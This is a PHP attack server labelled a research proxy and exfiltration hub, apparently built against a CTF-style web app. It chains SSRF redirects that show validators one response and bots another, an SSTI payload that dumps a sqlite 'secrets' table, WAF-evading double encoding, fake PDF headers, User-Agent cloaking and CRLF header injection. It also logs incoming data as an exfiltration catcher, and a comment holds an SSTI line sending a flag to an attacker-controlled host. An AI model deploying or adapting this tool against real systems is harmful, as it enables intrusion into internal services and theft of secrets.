<?php

/**
 * UNIVERSAL RESEARCH PROXY & EXFILTRATION HUB
 * -------------------------------------------
 * Features:
 * 1. TOCTOU Bypass (Stateful Redirects)
 * 2. Multi-Protocol Simulation (HTTP/PDF/JSON)
 * 3. Payload Encoding Tunneling
 * 4. Advanced Request Auditing (CURL/Selenium/Headless)
 */

session_start();
$log_file = 'audit_master.log';

// --- HELPER: LOG EVERYTHING ---
$headers = apache_request_headers();
$raw_body = file_get_contents('php://input');
$log_entry = sprintf(
    "[%s] %s | %s %s\nUA: %s\nHEADERS: %s\nBODY: %s\n-----------------------------------\n",
    date('Y-m-d H:i:s'),
    $_SERVER['REMOTE_ADDR'],
    $_SERVER['REQUEST_METHOD'],
    $_SERVER['REQUEST_URI'],
    $headers['User-Agent'] ?? 'None',
    json_encode($headers),
    $raw_body
);
file_put_contents($log_file, $log_entry, FILE_APPEND);

// --- CONFIGURATION ---
$internal_target = "http://127.0.0.1:5000/logs";
$ssti_payload = "{logify.__init__.__globals__[sqlite3].connect('history.db').execute('SELECT*FROM+secrets').fetchall()}";

// --- ROUTING LOGIC ---
$mode = $_GET['mode'] ?? 'auto';

switch ($mode) {
    /**
     * SCENARIO 1: The "Two-Face" Redirect (Bypass TTL/Status Checks)
     * First hit (Validator) gets 200 OK. Second hit (Bot) gets redirected.
     */
    case 'rebind':
        if (!isset($_SESSION['step'])) {
            $_SESSION['step'] = 1;
            http_response_code(200);
            echo "<html><body><h1>Validation Phase</h1><p>Status: Healthy</p></body></html>";
        } else {
            unset($_SESSION['step']);
            header("Location: $internal_target");
        }
        break;

    /**
     * SCENARIO 2: The "Encoding Tunnel"
     * Double-encodes braces to bypass PHP/WAF regex while satisfying Python's unquote.
     */
    case 'tunnel':
        $double_encoded = str_replace(['{', '}'], ['%257b', '%257d'], $ssti_payload);
        header("Location: http://google.com/?q=" . $double_encoded);
        break;

    /**
     * SCENARIO 3: Hostname Equivalence Bypass
     * Redirects to self with the payload to keep the Host header identical to the original request.
     */
    case 'equiv':
        if (!isset($_GET['poison'])) {
            header("Location: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?mode=equiv&poison=" . urlencode($ssti_payload));
        } else {
            echo "<html><body>Poisoned Page: " . htmlspecialchars($_GET['poison']) . "</body></html>";
        }
        break;

    /**
     * SCENARIO 4: File Type Masquerade
     * Satisfies validators that check if the target URL is a valid PDF or Image.
     */
    case 'file':
        header("Content-Type: application/pdf");
        // Minimal PDF header to fool magic-byte checkers
        echo "%PDF-1.4\n1 0 obj\n<< /Title (Exploit) >>\nendobj\n";
        break;

    /**
     * SCENARIO 5: Automatic Discovery (Default)
     * Detects if the requester is a headless browser and acts accordingly.
     */
    case 'auto':
    default:
        $ua = strtolower($headers['User-Agent'] ?? '');
        if (strpos($ua, 'headless') !== false || strpos($ua, 'selenium') !== false || strpos($ua, 'chrome') !== false) {
            // It's the bot! Redirect to the internal target.
            header("Location: $internal_target");
        } else {
            // It's likely a simple curl/validator. Stay quiet.
            http_response_code(200);
            echo "Research Node Active.";
        }
        break;
}

/**
 * RESEARCHER NOTE:
 * If testing for CRLF (Request Smuggling), use the following bypass:
 * ?mode=crlf
 */
if ($mode === 'crlf') {
    header("Location: http://127.0.0.1%0d%0aX-Injected-Header:True%0d%0a%0d%0aGET%20/logs%20HTTP/1.1");
}

/**
 * EXFILTRATION CATCHER:
 * If the app is blind, use this script as the target for data extraction.
 * e.g., {logify.__globals__.__builtins__.__import__('requests').get('http://your-ip:8080/?data='+flag)}
 */
if (isset($_GET['data'])) {
    file_put_contents('exfiltrated_data.log', "DATA: " . $_GET['data'] . "\n", FILE_APPEND);
}
?>
